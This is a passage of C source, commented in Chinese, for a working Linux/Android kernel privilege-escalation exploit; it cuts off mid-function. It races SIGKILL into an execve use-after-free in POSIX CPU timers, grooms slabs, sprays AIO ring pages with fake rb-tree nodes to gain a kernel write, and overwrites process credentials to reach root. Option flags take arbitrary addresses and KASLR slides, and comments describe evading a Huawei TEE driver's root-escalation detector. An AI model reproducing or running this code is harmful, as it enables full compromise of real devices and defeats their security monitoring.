                envp2[ne] = NULL;
            }
        }
        /* -V: exec 前铺一堆独立 VMA。execve 内部 exec_mmap 会同步拆解旧 mm,
         * 几千个 VMA 能把"仍在 execve 内部"的时间拉到毫秒级, 且这段在 comm
         * 切换之前, 于是 SIGKILL 必然落在 UAF 窗口内。 */
        if (g_vma_n > 0) {
            int made = 0;
            for (int i = 0; i < g_vma_n; i++) {
                void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                if (p == MAP_FAILED) break;
                *(volatile char *)p = (char)i;   /* 触发 page fault, 让 VMA 真实存在 */
                made++;
            }
            printf("[B7v] pre-exec VMAs=%d\n", made);
            fflush(stdout);
        }
        SH->t_go = now_us();
        if (g_predelay_us > 0) busy_wait_us(g_predelay_us);   /* -J: 受控 det 延时 */
        execve(g_xpath[0] ? g_xpath : "/proc/self/exe", argv, blk ? envp2 : NULL);
    }
    _exit(124);
}

static void victim_main(void)
{
    SH->tgid = (int)getpid();
    prctl(PR_SET_NAME, "v-main", 0, 0, 0);
    pin_cpu(g_vcpu);
    pthread_t th;
    pthread_attr_t at;
    pthread_attr_init(&at);
    pthread_attr_setstacksize(&at, 128 * 1024);
    if (pthread_create(&th, &at, exec_thread, NULL)) _exit(114);
    for (;;) pause();
}

/* ---------------- reader / killer（victim 的兄弟进程） ---------------- */
static int reader_main(void)
{
    char path[64];
    snprintf(path, sizeof path, "/proc/%d/maps", SH->tgid);
    prctl(PR_SET_NAME, "v-read", 0, 0, 0);
    int my = SH->gen;
    __sync_fetch_and_add(&SH->readers, 1);
    long long t0 = now_us();
    while (SH->gen == my && now_us() - t0 < 8000000LL) {
        int fd = open(path, O_RDONLY);
        if (fd < 0) {
            if (!SH->open_err) SH->open_err = errno;
            usleep(50);
            continue;
        }
        close(fd);
        __sync_fetch_and_add(&SH->opens, 1);
    }
    return 0;
}
/* 读 /proc/<tgid>/comm。de_thread() 会把 exec 线程和旧组长的 pid 互换, 于是
 * 这个文件的内容会经历三个阶段, 正好对应漏洞条件:
 *   "v-main"     → 旧组长(主线程), de_thread 还没完成
 *   "timer-exec" → 已完成 pid 交换, exec 还没结束  ← **唯一有效窗口**
 *   "exe"        → exec 已完成(bprm 文件名), 此时再杀已经没有悬空节点
 * 用它做触发, 比"猜固定延时"可靠得多(实测抖动 ±100us, 而窗口只有几十 us)。 */
static int read_comm(int tgid, char *cb, int n)
{
    char path[64];
    snprintf(path, sizeof path, "/proc/%d/comm", tgid);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    int r = (int)read(fd, cb, (size_t)n);
    close(fd);
    if (r <= 0) return r;
    cb[r] = 0;
    char *nl = strchr(cb, '\n');
    if (nl) *nl = 0;
    return r;
}

/* 复用一个已打开的 /proc/<tgid>/comm fd, 省掉每次 open/close 的路径查找开销
 * (实测 -W 漏检时 detect 延迟被拖到 4ms)。procfs 每次 lseek(0) 重新生成内容。 */
static int read_comm_fd(int fd, char *cb, int n)
{
    if (fd < 0) return -1;
    if (lseek(fd, 0, SEEK_SET) < 0) return -1;
    int r = (int)read(fd, cb, (size_t)n);
    if (r <= 0) return r;
    cb[r] = 0;
    char *nl = strchr(cb, '\n');
    if (nl) *nl = 0;
    return r;
}

static int killer_main(void)
{
    int tgid = SH->tgid;
    int my = SH->gen;
    prctl(PR_SET_NAME, "v-kill", 0, 0, 0);
    if (g_ncpu > 2) pin_cpu((g_pcpu + 2) % g_ncpu);
    long long t0 = now_us();
    while (!SH->exec_tid || SH->gen != my) { if (now_us() - t0 > 4000000LL) return 0; }
    int tid = SH->exec_tid;
    SH->killer_ready = 1;

    /* -W: 状态触发。等 comm 变成 'timer-exec'(= de_thread 已完成) 就立刻落刀。 */
    if (g_kmode_state) {
        long long tw = now_us();
        while (!SH->t_go && SH->gen == my && now_us() - tw < 4000000LL) sched_yield();
        char cb[64] = { 0 };
        int swapped = 0, finished = 0;
        int cfd = -1;
        {
            char path[64];
            snprintf(path, sizeof path, "/proc/%d/comm", tgid);
            cfd = open(path, O_RDONLY);          /* 只开一次, 循环里 lseek+read */
        }
        long long t1 = now_us();
        for (;;) {
            if (SH->gen != my) { if (cfd >= 0) close(cfd); return 0; }
            if (read_comm_fd(cfd, cb, sizeof cb - 1) > 0) {
                if (!strcmp(cb, "timer-exec")) { swapped = 1; break; }
                if (!strcmp(cb, "exe")) { finished = 1; break; }
            }
            if (now_us() - t1 > 5000000LL) break;
        }
        if (cfd >= 0) close(cfd);
        SH->t_det = now_us();
        if (!swapped) {
            printf("[K] 状态触发未命中 comm='%s'(%s), 不落刀\n",
                   cb[0] ? cb : "?", finished ? "exec 已完成" : "超时");
            return 0;
        }
        SH->killing = 1;
        while (g_kstate_delay > 0 && now_us() - SH->t_det < (long long)g_kstate_delay) { }
        syscall(SYS_tgkill, tgid, tgid, SIGKILL);
        SH->t_kill = now_us();
        SH->killed = 1;
        printf("[K] de_thread 完成(comm='timer-exec', 距 go %lldus) → 立即 SIGKILL\n",
               SH->t_kill - SH->t_go);
        return 0;
    }
    /* -j: 固定时间窗落刀。UAF 只在 SIGKILL 落在 execve 的 timer 清理窗口内时成立;
     * 干净系统上 execve 很快, 等 ESRCH 再杀就已经太晚 (子进程已正常 exit_itimers),
     * 于是 reap 时树是空的。这里改为在 go 之后固定 us 处立即整组 SIGKILL。 */
    if (g_ksweep ? g_kill_cur >= 0 : g_kill_us >= 0) {
        int ku = g_ksweep ? g_kill_cur : g_kill_us;
        long long tw = now_us();
        while (!SH->t_go && SH->gen == my && now_us() - tw < 4000000LL) sched_yield();
        while (now_us() - SH->t_go < (long long)ku && SH->gen == my) sched_yield();
        SH->t_det = now_us();
        SH->killing = 1;
        syscall(SYS_tgkill, tgid, tgid, SIGKILL);
        SH->t_kill = now_us();
        SH->killed = 1;
        return 0;
    }
    long long t1 = now_us();
    for (;;) {
        long r = (long)syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH) break;
        if (SH->gen != my) return 0;
        if (now_us() - t1 > 4000000LL) return 0;
    }
    SH->t_det = now_us();
    SH->killing = 1;
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    SH->t_kill = now_us();
    SH->killed = 1;
    return 0;
}

/* ---------------- filler：制造 partial slab 压力 ---------------- */
static int filler_main(int idx, int wfd)
{
    pin_cpu((g_vcpu + 1 + idx) % g_ncpu);
    char nm[16];
    snprintf(nm, sizeof nm, "fill%d", idx);
    prctl(PR_SET_NAME, nm, 0, 0, 0);
    static timer_t tv[NPF];
    struct sigevent ev;
    memset(&ev, 0, sizeof ev);
    ev.sigev_notify = SIGEV_NONE;
    int ok = 0;
    for (int i = 0; i < NPF; i++)
        if (timer_create(CLOCK_PROCESS_CPUTIME_ID, &ev, &tv[i]) == 0) ok++;
    for (int i = 0; i + 1 < ok; i++) timer_delete(tv[i]);   /* 留 1 个 → 一个 partial slab */
    char c = (char)('A' + idx);
    ssize_t w = write(wfd, &c, 1);
    (void)w;
    close(wfd);
    for (;;) pause();
    return 0;
}

/* ---------------- 僵尸探测 ---------------- */
static char proc_state(int pid, char *comm_out, size_t cn)
{
    char path[64], buf[512];
    snprintf(path, sizeof path, "/proc/%d/stat", pid);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return '?';
    ssize_t r = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (r <= 0) return '?';
    buf[r] = 0;
    char *a = strchr(buf, '('), *b = strrchr(buf, ')');
    if (!a || !b || b <= a) return '?';
    if (comm_out) {
        size_t n = (size_t)(b - a - 1);
        if (n >= cn) n = cn - 1;
        memcpy(comm_out, a + 1, n);
        comm_out[n] = 0;
    }
    char st = b[1] ? b[2] : '?';   /* ")<sp>STATE" */
    return st;
}

/* ---------------- AIO ring 喷涂 ---------------- */
static size_t aio_ring_pages_formula(int ev)
{
    /* 5.10 aio_setup_ring: nr_events+=2; size = sizeof(aio_ring)=0x20 + nr*sizeof(io_event)=0x20 */
    size_t sz = 0x20 + (size_t)(ev + 2) * 0x20;
    return (sz + 4095) / 4096;
}
/* 用两个相邻 ctx 的地址差实测 mmap_size (内核 mmap_base 递减, 连续 ctx 相邻) */
static size_t aio_measure_pages(int ev, unsigned long *keep, int *nkeep)
{
    unsigned long a = 0, b = 0;
    size_t formula = aio_ring_pages_formula(ev), got = 0;
    if (syscall(SYS_io_setup, ev, &a) || !a) return 0;
    if (syscall(SYS_io_setup, ev, &b) || !b) { keep[(*nkeep)++] = a; return formula; }
    size_t span = (size_t)(a - b);
    if (a > b && span && span % 4096 == 0 && span / 4096 <= formula + 2) got = span / 4096;
    printf("[B12a] AIO 实测: ev=%d formula=%zu 实测=%zu (a=%#lx b=%#lx span=%#zx)\n",
           ev, formula, got, a, b, span);
    keep[(*nkeep)++] = a;
    keep[(*nkeep)++] = b;
    if (!got) got = formula;
    return got;
}
/* 写模板到每一个 ring 页的 off 处 (node->__rb_parent_color/right/left) */
static long long spray_aio_round(const unsigned char *tmpl, int off, int nctx)
{
    size_t pages = g_ring_pages ? g_ring_pages : 1;
    long long np = 0;
    for (int i = 0; i < nctx && g_nctx < g_aio_maxctx; i++) {
        unsigned long ctx = 0;
        long r = syscall(SYS_io_setup, g_aioev, &ctx);
        if (r != 0 || !ctx) {
            printf("   [!] io_setup 失败 r=%ld errno=%d\n", r, errno);
            break;
        }
        g_ctxs[g_nctx++] = (uint64_t)ctx;
        unsigned char *base = (unsigned char *)(uintptr_t)ctx;
        for (size_t k = 0; k < pages; k++)
            memcpy(base + k * 4096 + off, tmpl + off, 0x18);
        np += (long long)pages;
    }
    __sync_synchronize();
    return np;
}
/* 读回: 内核执行 posix_cpu_timers_exit 的循环后会写 node->__rb_parent_color = node */
static int spray_aio_readback(int off, uint64_t node_va, int verbose)
{
    size_t pages = g_ring_pages ? g_ring_pages : 1;
    int hits = 0;
    for (int i = 0; i < g_nctx; i++) {
        unsigned char *base = (unsigned char *)(uintptr_t)g_ctxs[i];
        for (size_t k = 0; k < pages; k++) {
            uint64_t v = 0;
            memcpy(&v, base + k * 4096 + off, 8);
            if (v == node_va) {
                if (verbose)
                    printf("[B17a] READBACK HIT: ctx#%d page#%zu off=%#x 处的 pc 已被内核写成 "
                           "node_va(=%#llx) ⇒ rb_erase(我们的节点) 真的执行了\n",
                           i, k, off, (unsigned long long)v);
                hits++;
            }
        }
    }
    if (!hits && verbose)
        printf("[B17a] READBACK MISS: 全部 %d 个 ctx × %zu 页, off=%#x 处仍是我们写的 0 "
               "⇒ reap 没有走到 rb_erase(我们的节点)\n", g_nctx, pages, off);
    return hits;
}

/* 读外部靶 task 的 uid 四元组 (real/effective/saved/fs), 返回 1 成功。
 * 这是"我到底改没改到别人的 cred"的唯一权威回读 —— 本进程始终是 uid=2000。 */
static int target_uid_state(int *r, int *e, int *s, int *f)
{
    char p[64], b[4096];
    if (!g_leak_tid) return 0;
    snprintf(p, sizeof p, "/proc/%d/status", (int)g_leak_tid);
    int fd = open(p, O_RDONLY);
    int n = fd >= 0 ? (int)read(fd, b, sizeof b - 1) : -1;
    if (fd >= 0) close(fd);
    if (n <= 0) return 0;
    b[n] = 0;
    char *u = strstr(b, "\nUid:");
    if (!u) return 0;
    int a = -1, c = -1, d = -1, e2 = -1;
    if (sscanf(u, "\nUid:\t%d\t%d\t%d\t%d", &a, &c, &d, &e2) != 4) return 0;
    if (r) *r = a;
    if (e) *e = c;
    if (s) *s = d;
    if (f) *f = e2;
    return 1;
}

/* ---------------- 靶 task (-z) ----------------
 * 2026-10-28 实测: 内核华为 TEE 安全驱动里有 "UID root escalation!" / "GID root escalation!"
 * 两条告警, 命中后在**该 task 自己的上下文**里给自己发 SIGKILL(si_code=128/SI_KERNEL)。
 * 触发点是 fork/exit(即 prepare_creds / put_cred 这类 cred 生命周期动作),
 * 而**普通 syscall 不受影响** —— 心跳实验里 getuid()==0 的进程跑满 6s 无事。
 * 因此把角色拆开: 靶 task 只负责"存在 + 泄漏 cred 地址", 永不 fork / 永不 exit;
 * 所有 UAF 轮次都由 uid=2000 的干净进程执行, 写原语(rb_erase)发生在 victim 退出路径,
 * 写入地址完全由我们的模板决定 → 可以直接写靶 task 的 cred。 */
/* 阶段标记: 每次关键步骤都 fsync 落盘, 因为 panic 会丢掉 page cache 里没回写的数据,
 * 上一轮 A2.log 整个文件在重启后都不存在 → 无法判断走到哪一步。 */
static void sm(const char *fmt, ...)
{
    char b[256];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap);
    va_end(ap);
    int fd = open("/data/local/tmp/xiaoyi-pilot/stage.txt", O_CREAT | O_WRONLY | O_APPEND, 0644);
    if (fd >= 0) {
        char line[320];
        int m = snprintf(line, sizeof line, "[%lldms pid=%d] %.*s\n",
                         now_us() / 1000, getpid(), n, b);
        if (write(fd, line, m) != m) { /* ignore */ }
        fsync(fd);
        close(fd);
    }
    printf("%s\n", b);
    fflush(stdout);
}

static void z_refresh_handler(int sig)
{
    (void)sig;
    syscall(SYS_setresgid, (gid_t)getgid(), (gid_t)getgid(), (gid_t)getgid());
    g_zrefreshed = 1;
}

static void z_target_loop(void)
{
    signal(SIGUSR1, z_refresh_handler);
    printf("[Z0] 靶 task pid=%d tid=%d uid=%d euid=%d gid=%d — 静止等待, 永不 fork/exit\n",
           getpid(), (int)syscall(SYS_gettid), (int)getuid(), (int)geteuid(), (int)getgid());
    fflush(stdout);
    for (;;) {
        pause();
        if (g_zrefreshed) {
            g_zrefreshed = 0;
            printf("[Z1] cred 已刷新 (setresgid → prepare_creds), 地址稳定\n");
            fflush(stdout);
        }
    }
}

/* ---------------- 主流程 ---------------- */
/* 链内自测: 写原语(reap)刚落地的瞬间, 由本进程就地验证 0600 文件的真实读写权限。
 * 外部靶一旦变成 uid0 会被秒级 SIGKILL, 等不到下一轮轮询, 所以只能在这里抢时间。
 * 全程用裸 write(1,...): 不经 stdio, 保证"死在哪一步"能从日志看出来。 */
static void self_probe_files(const char *phase)
{
    const char *paths[3] = {
        "/sys/fs/selinux/enforce",
        "/proc/1/status",
        "/data/local/tmp/xiaoyi-pilot/secret0600",
    };
    const char *tags[3] = { "selinux_enforce", "proc1_status", "secret0600" };
    char b[384];
    int n;
    {
        uid_t ru = (uid_t)-1, eu = (uid_t)-1, su = (uid_t)-1;
        gid_t rg = (gid_t)-1, eg = (gid_t)-1, sg = (gid_t)-1;
        getresuid(&ru, &eu, &su);
        getresgid(&rg, &eg, &sg);
        n = snprintf(b, sizeof b,
                     "[A0] %s 身份: getuid=%d geteuid=%d getgid=%d | resuid=%d/%d/%d resgid=%d/%d/%d\n",
                     phase, (int)getuid(), (int)geteuid(), (int)getgid(),
                     (int)ru, (int)eu, (int)su, (int)rg, (int)eg, (int)sg);
        if (write(1, b, n) < 0) {}
    }
    for (int i = 0; i < 3; i++) {
        int fd;
        errno = 0; fd = open(paths[i], O_RDWR);
        n = snprintf(b, sizeof b, "[A1] %-16s open(O_RDWR)=%d errno=%d(%s)\n",
                     tags[i], fd, errno, strerror(errno));
        if (write(1, b, n) < 0) {}
        if (fd < 0) {
            errno = 0; fd = open(paths[i], O_RDONLY);
            n = snprintf(b, sizeof b, "[A2] %-16s open(O_RDONLY)=%d errno=%d(%s)\n",
                         tags[i], fd, errno, strerror(errno));
            if (write(1, b, n) < 0) {}
            if (fd < 0) continue;
        }
        {
            char c[160];
            ssize_t r;
            errno = 0; r = read(fd, c, sizeof c - 1);
            if (r > 0) { c[r] = 0; char *nl = strchr(c, '\n'); if (nl) *nl = 0; }
            else c[0] = 0;
            n = snprintf(b, sizeof b, "[A3] %-16s read=%zd errno=%d(%s) head='%s'\n",
                         tags[i], r, errno, strerror(errno), c);
            if (write(1, b, n) < 0) {}
        }
        if (!strcmp(tags[i], "secret0600")) {
            ssize_t w;
            errno = 0; w = write(fd, "\nPROOF\n", 7);
            n = snprintf(b, sizeof b, "[A4] secret0600 write=%zd errno=%d(%s)\n",
                         w, errno, strerror(errno));
            if (write(1, b, n) < 0) {}
        }
        close(fd);
    }
    if (write(1, "[A9] self-probe done\n", 21) < 0) {}
}

/* -Y: probe 子进程的 SIGUSR1 处理器 (只置位, 真正的 setresgid 在主循环里做) */
static volatile sig_atomic_t g_probe_usr1 = 0;
static void on_probe_usr1(int sig) { (void)sig; g_probe_usr1 = 1; }
static int on_probe_usr1_fired(void) { return (int)g_probe_usr1; }
static void on_probe_usr1_clear(void) { g_probe_usr1 = 0; }

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    {   /* 启动自检：确认二进制真的被执行（无输出即在此前就死了） */
        char m[48];
        int n = snprintf(m, sizeof m, "[ENTER] pid=%d argc=%d\n", (int)getpid(), argc);
        write(1, m, n);
    }
    /* 关键: 不挂在 adb shell 会话语义下。PARKED 状态必须真的常驻,
     * 否则 adb 一断 → SIGHUP → 进程退出 → zombie 被 init 回收 →
     * posix_cpu_timers_exit 在"已归还 buddy 且无人占用"的 8KB 上跑 rb_erase → panic。 */
    setsid();
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    /* 任何一次运行(包括最终 PARKED 常驻)都不能被 OOM killer 摘掉:
     * 父进程死 → zombie 移交 init → init 在 release_task 上踩脏树 → 设备重启。
     * 直连 adb shell 时 relay 可能不可用, 失败不影响其他流程。 */
    /* --puresh 必须在 self_protect 之前生效: 纯 shell 下 relay 不可用,
     * 否则 oom_score_adj 会去 fork 不存在的 dirtyinit。 */
    for (int i = 1; i < argc; i++)
        if (!strcmp(argv[i], "--puresh")) { g_puresh = 1; g_norelay = 1; }
    self_protect();
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-p") && i + 1 < argc) g_npipe = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-H") && i + 1 < argc) g_drain_pages = atoll(argv[++i]);
        else if (!strcmp(argv[i], "-n") && i + 1 < argc) g_ntimer = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-N") && i + 1 < argc) g_spray_n = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-F") && i + 1 < argc) g_fspray_mb = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-y") && i + 1 < argc) g_spray_ms = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-O") && i + 1 < argc) g_credoff = strtoull(argv[++i], NULL, 16);
        else if (!strcmp(argv[i], "-M") && i + 1 < argc) {
            /* 逗号分隔的十六进制 offset 列表, 最多 4 个 */
            char *s = argv[++i];
            g_noff = 0;
            while (s && *s && g_noff < 4) {
                g_offs[g_noff++] = strtoull(s, &s, 16);
                if (*s == ',' || *s == ':') s++;
                else break;
            }
        }
        else if (!strcmp(argv[i], "-C") && i + 1 < argc) {
            /* 洁净父 + 每偏移一个一次性子进程（子进程是 cred 目标，成功即退场） */
            char *s = argv[++i];
            g_noff = 0;
            while (s && *s && g_noff < 4) {
                g_offs[g_noff++] = strtoull(s, &s, 16);
                if (*s == ',' || *s == ':') s++;
                else break;
            }
            g_cmode = 1;
        }
        else if (!strcmp(argv[i], "-G") && i + 1 < argc) g_gfork = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-J")) g_tdump = 1;
        else if (!strcmp(argv[i], "-z")) g_zchild = 1;
        else if (!strcmp(argv[i], "-Z") && i + 1 < argc) g_leak_tid = (int32_t)atoi(argv[++i]);
        else if (!strcmp(argv[i], "-I")) g_insert = 1;
        else if (!strcmp(argv[i], "-d") && i + 1 < argc) {
            /* -d <绝对目标地址>:<值>  借 -I 插入路径写任意 .data（地址需已含 slide） */
            char *gs = argv[++i];
            g_gtgt = strtoull(gs, &gs, 16);
            g_gval = 0;
            if (*gs == ':') { gs++; g_gval = strtoull(gs, &gs, 16); }
            g_insert = 1;
        }
        else if (!strcmp(argv[i], "-B") && i + 1 < argc) g_ins_bootid = strtoull(argv[++i], NULL, 16);
        else if (!strcmp(argv[i], "-U") && i + 1 < argc) g_ucmd = argv[++i];
        else if (!strcmp(argv[i], "-m") && i + 1 < argc) g_modpath = argv[++i];
        else if (!strcmp(argv[i], "-Q") && i + 1 < argc) { g_ucmd = argv[++i]; g_caproot = 1; }
        else if (!strcmp(argv[i], "-P") && i + 1 < argc) {
            /* 指针写: <target>:<value>,<target>:<value>,... (每对一轮) */
            char *s = argv[++i];
            g_nop = 0;
            while (s && *s && g_nop < 4) {
                g_ops_t[g_nop] = strtoull(s, &s, 16);
                g_ops_v[g_nop] = 0;
                g_ops_scr[g_nop] = 0;
                if (*s == ':') {
                    s++;
                    if ((*s == 'S' || *s == 's') && (s[1] == 'C' || s[1] == 'c')) {
                        /* :SCR = PAYLOAD 用本喷涂页内的零槽(运行时决定, 高 32 位仍为 0xffffff8x) */
                        g_ops_scr[g_nop] = 1; s += 2;
                    } else {
                        g_ops_v[g_nop] = strtoull(s, &s, 16);
                    }
                }
                g_nop++;
                if (*s == ',') { s++; continue; }
                break;
            }
        }
        else if (!strcmp(argv[i], "-r") && i + 1 < argc) g_robust = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-s") && i + 1 < argc) g_slide = strtoull(argv[++i], NULL, 16);
        else if (!strcmp(argv[i], "-a") && i + 1 < argc) g_attempts = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-R") && i + 1 < argc) g_nreader = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-w") && i + 1 < argc) g_pre_us = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-g") && i + 1 < argc) g_rounds = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-X") && i + 1 < argc) g_spray_cpu = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-V") && i + 1 < argc) g_vcpu_fix = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-T") && i + 1 < argc) g_tmode = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-A") && i + 1 < argc) g_naio = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-E") && i + 1 < argc) g_aioev = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-0")) g_norelay = 1;
        else if (!strcmp(argv[i], "--pspair") && i + 1 < argc) g_ps_npair = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-1")) g_selfchk = 1;
        else if (!strcmp(argv[i], "-t")) g_thread_clock = 1;
        else if (!strcmp(argv[i], "-k")) g_noload = 1;
        else if (!strcmp(argv[i], "-W")) g_kmode_state = 1;
        else if (!strcmp(argv[i], "-w") && i + 1 < argc) g_kstate_delay = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-h")) g_autoholes = 0;
        else if (!strcmp(argv[i], "-K")) g_lifetrace = 1;
        else if (!strcmp(argv[i], "-Y")) g_hkip = 1;
        else if (!strcmp(argv[i], "-q")) g_geomdel = 1;
        else if (!strcmp(argv[i], "-X") && i + 1 < argc) g_xrounds = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-Q") && i + 1 < argc) g_qtest = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-S")) g_evchain = 1;
        else if (!strcmp(argv[i], "-D")) g_dverify = 1;
        else if (!strcmp(argv[i], "-b")) g_blind = 1;
        else if (!strcmp(argv[i], "-j") && i + 1 < argc) {
            /* -j <us>              固定延时落刀
             * -j <start>:<step>:<n> 时间步进扫描 (第 at 轮 = start + (at-1)*step) */
            char *spec = argv[++i];
            char *c1 = strchr(spec, ':');
            if (c1) {
                char buf[64];
                snprintf(buf, sizeof buf, "%s", spec);
                char *a = buf, *b = strchr(buf, ':');
                *b++ = 0;
                char *c = strchr(b, ':');
                if (c) *c++ = 0;
                g_kill_us0 = atoi(a);
                g_kill_step = b && *b ? atoi(b) : 0;
                g_ksweep_n = c && *c ? atoi(c) : 0;
                g_kill_us = g_kill_us0;
                g_ksweep = 1;
            } else {
                g_kill_us = (int)strtol(spec, NULL, 0);
            }
        }
        /* 注意: 大写 -E/-V 已被上面的 AIO/绑核 旧 handler 抢占(死代码), 这里用小写。 */
        else if (!strcmp(argv[i], "-e") && i + 1 < argc) g_envkb = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-v") && i + 1 < argc) g_vma_n = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-J") && i + 1 < argc) g_predelay_us = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-x") && i + 1 < argc) { snprintf(g_xpath, sizeof g_xpath, "%s", argv[++i]); }
        else if (!strcmp(argv[i], "-H")) g_force_hit = 1;
        else if (!strcmp(argv[i], "-f")) g_ftrace = 1;
        else if (!strcmp(argv[i], "-c")) {
            g_cspray = 1;
            if (i + 1 < argc && argv[i + 1][0] != '-') g_cspray_ms = atoi(argv[++i]);
        }
    }
    if (g_selfchk) { norelay_selfcheck(); return 0; }
    if (g_norelay) printf("[N] norelay=1: relay_q 全部改为直写 tracefs (uid=%d)\n", (int)getuid());
    if (g_puresh) {
        g_norelay = 1;
        g_insert = 1;                 /* 无 cred 泄漏 → 只能走 stage1 插入桥 */
        g_thread_clock = 1;           /* 历史成功配方用 -t (thread cpu timer) */
        if (g_ucmd || g_caproot) {
            printf("[-] PURESH 不支持 -U/-Q (需要 task/cred 泄露); 拒绝启动\n");
            return 1;
        }
        /* PSBENIGN=1 只做空洞/喷涂验证，不写模板也不碰内核地址，允许无 slide。
         * 这样验证环节完全不需要跑 kaslr_self.sh（读 trace_pipe_raw 后该机会 panic）。 */
        if (!g_slide && !getenv("PSBENIGN")) {
            printf("[-] PURESH 需要 -s <slide>（kaslr_self.sh 从 irq/tasklet_entry 取）; 拒绝无 slide 开火\n");
            return 1;
        }
        printf("[PS] PURESH: 纯 shell (no relay/no kmem); stage1 insert; slide=%#llx holes=%d\n",
               (unsigned long long)g_slide, g_ps_npair);
    }
    /* 被 exec 回来的那个自己（argv[0] 空串）直接退出 */
    if (argc > 0 && argv && argv[0] && argv[0][0] == '\0') _exit(42);
    /* 链内自测只在"本进程自己的 cred 是目标"时开启(非 -Z 外部靶/非 comm/非指针写/非插入/非 -C) */
    g_selfprobe = (!g_leak_tid && !g_tmode && !g_nop && !g_insert && !g_cmode && !g_ucmd && !g_hkip);
    if (g_ucmd && !strcmp(g_ucmd, "FAKECRED")) g_fakecred = 1;
    if (g_ucmd && !strcmp(g_ucmd, "FCDIAG")) { g_fakecred = 1; g_fcdiag = 1; }
    if (g_ucmd && !strcmp(g_ucmd, "FCIMP"))  { g_fakecred = 1; g_fcimp = 1; }
    if (g_ucmd && !strcmp(g_ucmd, "FCIMPX")) { g_fakecred = 1; g_fcimp = 1; g_act = 1; }
    if (g_ucmd && !strcmp(g_ucmd, "FCPUT"))  { g_fakecred = 1; g_fcput = 1; }
    if (g_ucmd && !strcmp(g_ucmd, "FCFORK")) { g_fakecred = 1; g_fcfork = 1; }
    if (g_ucmd && !strcmp(g_ucmd, "FCFORKKSU")) { g_fakecred = 1; g_fcfork = 1; g_ksuinst = 1; }
    if (g_ucmd && !strcmp(g_ucmd, "FCFORKACT")) { g_fakecred = 1; g_fcfork = 1; g_act = 1; }
    if (g_ucmd && !strcmp(g_ucmd, "FCFORKPANIC")) { g_fakecred = 1; g_fcfork = 1; g_act = 1; g_panic = 1; }
    if (g_ucmd && !strncmp(g_ucmd, "SHELL:", 6)) { g_fakecred = 1; g_fcfork = 1; g_act = 1; g_fcimp = 1; g_shellcmd = g_ucmd + 6; }
    if (g_ucmd && !strncmp(g_ucmd, "DAEMONX:", 8)) { g_fakecred = 1; g_act = 1; g_nomod = 1; g_daemon = g_ucmd + 8; }
    if (g_ucmd && !strncmp(g_ucmd, "SHELLX:", 7)) { g_fakecred = 1; g_act = 1; g_nomod = 1; g_shellcmd = g_ucmd + 7; }
    if (g_ucmd && !strcmp(g_ucmd, "RELOAD")) { g_fakecred = 1; g_fcfork = 1; g_reload = 1; }
    g_uexec = g_ucmd;
    if (g_ucmd && !strcmp(g_ucmd, "AAWL"))   { g_aawl = 1; }
    /* AAWL:<cmd>: 父进程进 AAWL 命令循环的同时, probe 放行后 exec <cmd> */
    else if (g_ucmd && !strncmp(g_ucmd, "AAWL:", 5)) { g_aawl = 1; g_uexec = g_ucmd + 5; }
    /* AAWX:<path>: probe 放行后直接 execve(<path>)，不经过 sh -c（无 fork、无空格/引号问题） */
    else if (g_ucmd && !strncmp(g_ucmd, "AAWX:", 5)) { g_aawl = 1; g_uexec = g_ucmd + 5; g_uexec_direct = 1; }
    if (g_zchild) { z_target_loop(); return 0; }
    if (g_npipe < 8) g_npipe = 8;
    if (g_ntimer < NPF || g_ntimer > 4096) g_ntimer = NT;
    if (g_spray_n < NPF || g_spray_n > 4096) g_spray_n = NT;

    if (g_cmode) {
        /* 每个 cred 偏移一把"一次性刀": 子进程打自己的 cred → 退场 → 父进程回收。
         * 父进程全程 uid=2000 且永不改 cred、永不退出，也不留任何孤儿给 init。 */
        int cn = g_noff;
        printf("[C0] 洁净父 pid=%d uid=%d gid=%d, 计划 %d 把一次性子进程 offsets=",
               getpid(), (int)getuid(), (int)getgid(), cn);
        for (int k = 0; k < cn; k++)
            printf("%s%#llx", k ? "," : "", (unsigned long long)g_offs[k]);
        printf("\n");
        fflush(stdout);
        for (int k = 0; k < cn; k++) {
            pid_t c = fork();
            if (c < 0) { printf("[-] fork 一次性子进程失败 errno=%d\n", errno); break; }
            if (c == 0) {
                g_cchild = 1;
                g_credoff = g_offs[k];
                g_noff = 0;
                goto single_round;
            }
            int st = 0;
            waitpid(c, &st, 0);
            printf("[C1] 一次性子 pid=%d offset=%#llx 已回收 status=%#x; 父仍 uid=%d gid=%d\n",
                   c, (unsigned long long)g_offs[k], st, (int)getuid(), (int)getgid());
            fflush(stdout);
            if (g_tdump) {
                char tp[128];
